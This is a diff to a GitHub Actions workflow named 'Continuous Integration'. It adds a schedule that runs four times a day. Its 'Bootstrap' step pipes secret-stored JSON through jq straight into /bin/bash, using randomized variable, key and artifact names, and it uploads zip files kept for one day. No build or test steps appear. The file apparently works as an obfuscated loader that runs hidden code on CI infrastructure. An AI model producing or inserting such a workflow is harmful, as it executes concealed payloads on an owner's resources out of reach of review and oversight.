@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '37 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,15 +16,15 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          la430: ${{ secrets.la430 }}
+          ysd77699: ${{ secrets.ysd77699 }}
         run: |
-          printf '%s' "$la430" | jq -r .tsvq466 | /bin/bash
-          echo $txo62823 | jq -r .q0188 | /bin/bash
-          printf '%s' "$dfqh216" | jq -r .tt1130 | /bin/bash
+          printf '%s' "$ysd77699" | jq -r .jjdl64 | /bin/bash
+          printf '%s' "$rqvx6620" | jq -r .blo794 | /bin/bash
+          printf '%s' "$wog54" | jq -r .d7318 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: kCl68Tbh
+          name: rM8Yjpf4
           path: "*.zip"
           retention-days: 1
